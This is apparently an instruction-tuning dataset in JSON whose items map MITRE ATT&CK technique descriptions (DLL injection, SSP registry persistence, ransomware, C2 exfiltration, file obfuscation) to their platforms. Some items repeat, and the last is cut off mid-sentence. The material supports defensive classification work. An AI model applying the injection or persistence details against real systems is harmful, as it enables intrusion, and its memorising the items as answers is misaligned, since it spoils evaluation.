    "instruction": "What are the platforms that are related to the following technique description: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Information Discovery (T1082);\nTechnique System Information Discovery (T1082) is applicable to platforms: Linux,  Network,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, IaaS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
      "answer": "The provided description is related to MITRE technique System Information Discovery (T1082);\nTechnique System Information Discovery (T1082) is applicable to platforms: Linux,  Network,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, IaaS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \n\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL).  \n\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>). \n\nAnother variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process. This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk. \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.",
    "context": "",
    "output": "The provided description is related to MITRE technique Process Injection: Dynamic-link Library Injection (T1055.001);\nTechnique Process Injection: Dynamic-link Library Injection (T1055.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \n\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL).  \n\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>). \n\nAnother variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process. This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk. \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.",
      "answer": "The provided description is related to MITRE technique Process Injection: Dynamic-link Library Injection (T1055.001);\nTechnique Process Injection: Dynamic-link Library Injection (T1055.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.\n\nThe SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.",
    "context": "",
    "output": "The provided description is related to MITRE technique Boot or Logon Autostart Execution: Security Support Provider (T1547.005);\nTechnique Boot or Logon Autostart Execution: Security Support Provider (T1547.005) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.\n\nThe SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.",
      "answer": "The provided description is related to MITRE technique Boot or Logon Autostart Execution: Security Support Provider (T1547.005);\nTechnique Boot or Logon Autostart Execution: Security Support Provider (T1547.005) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system.   \n\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.\n\nWithin macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host\u2019s registered services on the network. For example, adversaries can use a mDNS query (such as <code>dns-sd -B _ssh._tcp .</code>) to find other systems broadcasting the ssh service.",
    "context": "",
    "output": "The provided description is related to MITRE technique Network Service Discovery (T1046);\nTechnique Network Service Discovery (T1046) is applicable to platforms: IaaS,  Linux,  Network,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: IaaS,  Linux,  Network,  Windows,  macOS, Containers.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system.   \n\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.\n\nWithin macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host\u2019s registered services on the network. For example, adversaries can use a mDNS query (such as <code>dns-sd -B _ssh._tcp .</code>) to find other systems broadcasting the ssh service.",
      "answer": "The provided description is related to MITRE technique Network Service Discovery (T1046);\nTechnique Network Service Discovery (T1046) is applicable to platforms: IaaS,  Linux,  Network,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: IaaS,  Linux,  Network,  Windows,  macOS, Containers.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Command and Scripting Interpreter: Windows Command Shell (T1059.003);\nTechnique Command and Scripting Interpreter: Windows Command Shell (T1059.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
      "answer": "The provided description is related to MITRE technique Command and Scripting Interpreter: Windows Command Shell (T1059.003);\nTechnique Command and Scripting Interpreter: Windows Command Shell (T1059.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as File and Directory Permissions Modification or System Shutdown/Reboot, in order to unlock and/or gain access to manipulate these files. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR. \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares. Encryption malware may also leverage Internal Defacement, such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted.",
    "context": "",
    "output": "The provided description is related to MITRE technique Data Encrypted for Impact (T1486);\nTechnique Data Encrypted for Impact (T1486) is applicable to platforms: Linux,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, IaaS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as File and Directory Permissions Modification or System Shutdown/Reboot, in order to unlock and/or gain access to manipulate these files. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR. \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares. Encryption malware may also leverage Internal Defacement, such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted.",
      "answer": "The provided description is related to MITRE technique Data Encrypted for Impact (T1486);\nTechnique Data Encrypted for Impact (T1486) is applicable to platforms: Linux,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, IaaS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Exfiltration Over C2 Channel (T1041);\nTechnique Exfiltration Over C2 Channel (T1041) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.",
      "answer": "The provided description is related to MITRE technique Exfiltration Over C2 Channel (T1041);\nTechnique Exfiltration Over C2 Channel (T1041) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.\n\nObject Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by Component Object Model, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.\n\nMicrosoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via Phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.\n\nDDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a Command and Scripting Interpreter. DDE execution can be invoked remotely via Remote Services such as Distributed Component Object Model (DCOM).?",
    "context": "",
    "output": "The provided description is related to MITRE technique Inter-Process Communication: Dynamic Data Exchange (T1559.002);\nTechnique Inter-Process Communication: Dynamic Data Exchange (T1559.002) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.\n\nObject Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by Component Object Model, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.\n\nMicrosoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via Phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.\n\nDDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a Command and Scripting Interpreter. DDE execution can be invoked remotely via Remote Services such as Distributed Component Object Model (DCOM).",
      "answer": "The provided description is related to MITRE technique Inter-Process Communication: Dynamic Data Exchange (T1559.002);\nTechnique Inter-Process Communication: Dynamic Data Exchange (T1559.002) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a Command and Scripting Interpreter, such as cmd as well as a Network Device CLI, which have functionality to interact with the file system to gather information. Adversaries may also use Automated Collection on the local system.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Data from Local System (T1005);\nTechnique Data from Local System (T1005) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a Command and Scripting Interpreter, such as cmd as well as a Network Device CLI, which have functionality to interact with the file system to gather information. Adversaries may also use Automated Collection on the local system.",
      "answer": "The provided description is related to MITRE technique Data from Local System (T1005);\nTechnique Data from Local System (T1005) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution). \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013);\nTechnique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution). \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.",
      "answer": "The provided description is related to MITRE technique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013);\nTechnique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver\u2019s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.\n\nFor efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as Asymmetric Cryptography.",
    "context": "",
    "output": "The provided description is related to MITRE technique Encrypted Channel: Asymmetric Cryptography (T1573.002);\nTechnique Encrypted Channel: Asymmetric Cryptography (T1573.002) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver\u2019s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.\n\nFor efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as Asymmetric Cryptography.",
      "answer": "The provided description is related to MITRE technique Encrypted Channel: Asymmetric Cryptography (T1573.002);\nTechnique Encrypted Channel: Asymmetric Cryptography (T1573.002) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.\n\nThere are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic.\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various Remote Services in order to achieve remote Execution.",
    "context": "",
    "output": "The provided description is related to MITRE technique Command and Scripting Interpreter (T1059);\nTechnique Command and Scripting Interpreter (T1059) is applicable to platforms: Google Workspace,  IaaS,  Linux,  Network,  Office 365,  Windows,  macOS, Azure AD;\nTherefore, the given procedure description is related to platforms: Google Workspace,  IaaS,  Linux,  Network,  Office 365,  Windows,  macOS, Azure AD.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.\n\nThere are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic.\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various Remote Services in order to achieve remote Execution.",
      "answer": "The provided description is related to MITRE technique Command and Scripting Interpreter (T1059);\nTechnique Command and Scripting Interpreter (T1059) is applicable to platforms: Google Workspace,  IaaS,  Linux,  Network,  Office 365,  Windows,  macOS, Azure AD;\nTherefore, the given procedure description is related to platforms: Google Workspace,  IaaS,  Linux,  Network,  Office 365,  Windows,  macOS, Azure AD.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\n\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).\n\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Network Configuration Discovery (T1016);\nTechnique System Network Configuration Discovery (T1016) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\n\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).\n\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.",
      "answer": "The provided description is related to MITRE technique System Network Configuration Discovery (T1016);\nTechnique System Network Configuration Discovery (T1016) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution). \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be 